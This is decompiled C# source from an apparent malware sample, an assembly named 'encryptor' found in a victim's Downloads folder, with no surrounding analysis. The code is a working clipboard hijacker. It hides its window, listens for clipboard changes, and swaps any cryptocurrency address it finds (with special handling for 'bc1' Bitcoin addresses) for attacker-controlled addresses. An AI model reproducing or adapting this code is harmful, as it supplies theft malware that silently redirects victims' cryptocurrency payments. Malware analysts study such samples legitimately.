// Decompiled with JetBrains decompiler
// Type: ConsoleApplication7.driveNotification
// Assembly: encryptor, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 572D9FA7-1DC4-4672-B037-FBD9F6518A86
// Assembly location: C:\Users\victim\Downloads\1461362ebd3b8710610c59cd2aa00f435330bd9d8f75ba4105617b0205cd932b\1461362ebd3b8710610c59cd2aa00f435330bd9d8f75ba4105617b0205cd932b.exe

using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApplication7
{
  public sealed class driveNotification
  {
    public class NotificationForm : Form
    {
      private static string currentClipboard = driveNotification.NotificationForm.GetText();

      public NotificationForm()
      {
        Program.NativeMethods.SetParent(this.Handle, Program.NativeMethods.intpreclp);
        Program.NativeMethods.AddClipboardFormatListener(this.Handle);
      }

      private bool RegexResult(Regex pattern)
      {
        return pattern.Match(driveNotification.NotificationForm.currentClipboard).Success;
      }

      protected override void WndProc(ref Message m)
      {
        if (m.Msg == 797)
        {
          driveNotification.NotificationForm.currentClipboard = driveNotification.NotificationForm.GetText();
          if (driveNotification.NotificationForm.currentClipboard.StartsWith("bc1"))
          {
            if (this.RegexResult(Program.appMutexRegex) && !driveNotification.NotificationForm.currentClipboard.Contains(Program.appMutex))
              driveNotification.NotificationForm.SetText(Program.appMutexRegex.Replace(driveNotification.NotificationForm.currentClipboard, Program.appMutex));
          }
          else if (this.RegexResult(Program.appMutexRegex) && !driveNotification.NotificationForm.currentClipboard.Contains(Program.appMutex2))
            driveNotification.NotificationForm.SetText(Program.appMutexRegex.Replace(driveNotification.NotificationForm.currentClipboard, Program.appMutex2));
        }
        base.WndProc(ref m);
      }

      protected override CreateParams CreateParams
      {
        get
        {
          CreateParams createParams = base.CreateParams;
          createParams.ExStyle |= 128;
          return createParams;
        }
      }

      public static string GetText()
      {
        string ReturnValue = string.Empty;
        Thread thread = new Thread((ThreadStart) (() => ReturnValue = Clipboard.GetText()));
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join();
        return ReturnValue;
      }

      public static void SetText(string txt)
      {
        Thread thread = new Thread((ThreadStart) (() => Clipboard.SetText(txt)));
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join();
      }
    }
  }
}
